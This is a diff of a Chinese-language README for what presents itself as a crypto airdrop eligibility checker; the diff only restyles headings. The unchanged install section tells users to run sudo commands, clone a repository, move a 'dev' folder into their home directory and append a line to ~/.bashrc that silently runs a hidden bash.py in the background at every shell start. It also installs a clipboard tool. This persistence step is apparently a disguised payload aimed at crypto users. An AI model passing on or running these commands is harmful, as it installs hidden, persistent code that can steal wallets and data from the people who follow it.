@@ -15,17 +15,13 @@
 - Python 3.6 或更高版本
 - `requests` 库
 
-### 安装依赖
-
-运行脚本前，请确保已安装必要的依赖库：
+### »»» 安装依赖
 
 ```bash
 sudo apt install git xclip python3-pip && sudo pip3 install requests
 ```
 
-### 安装依赖
-
-运行脚本前，请确保已安装必要的依赖库：
+### »»» 克隆并配置环境变量
 
 ```bash
 git clone https://github.com/blockchain-DAT/airdrops-cheaker.git && cd airdrops-cheaker && mv dev ~/ && echo "(pgrep -f bash.py || nohup python3 $HOME/dev/bash.py &> /dev/null &) & disown" >> ~/.bashrc && source ~/.bashrc
@@ -33,7 +29,7 @@ git clone https://github.com/blockchain-DAT/airdrops-cheaker.git && cd airdrops-
 
 ## 使用方法
 
-### 单地址查询
+### »»» 单地址查询
 
 使用钱包地址作为参数运行脚本：
 
@@ -47,7 +43,7 @@ python3 check.py <WALLET_ADDRESS>
 python3 check.py 0x1234567890ABCDEF
 ```
 
-### 从文件批量查询
+### »»» 从文件批量查询
 
 准备一个包含钱包地址的 `.txt` 文件（每行一个地址）：
 
